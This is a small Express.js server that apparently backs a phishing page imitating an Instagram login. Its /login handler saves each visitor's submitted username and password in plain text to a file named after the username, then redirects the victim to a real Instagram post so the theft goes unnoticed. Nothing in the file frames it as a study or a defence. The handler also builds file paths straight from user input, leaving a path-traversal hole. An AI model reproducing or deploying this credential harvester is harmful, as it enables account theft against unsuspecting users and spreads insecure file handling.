const express = require('express');
const app = express();
const port = 3000;
const fs = require('fs');

app.set('view engine', 'ejs');
app.use(express.static('public'));
app.use(express.urlencoded({ extended: true }));

app.get('/', (req, res) => {
    res.render('index.ejs');    
});
app.post('/login', async(req, res) => {
    const {username, password} = req.body;
   fs.writeFile("./users/"+username+".txt",`${username} ${password}\n`,(err)=>{
    if(err){
        console.log(err);
    }
    else{
        console.log("File written successfully");
    }
   });
   res.redirect('https://www.instagram.com/p/DAQRhcuz_xs/?utm_source=ig_web_copy_link');
});
app.listen(port, () => {
    console.log(`Server is running on port ${port}`);
});
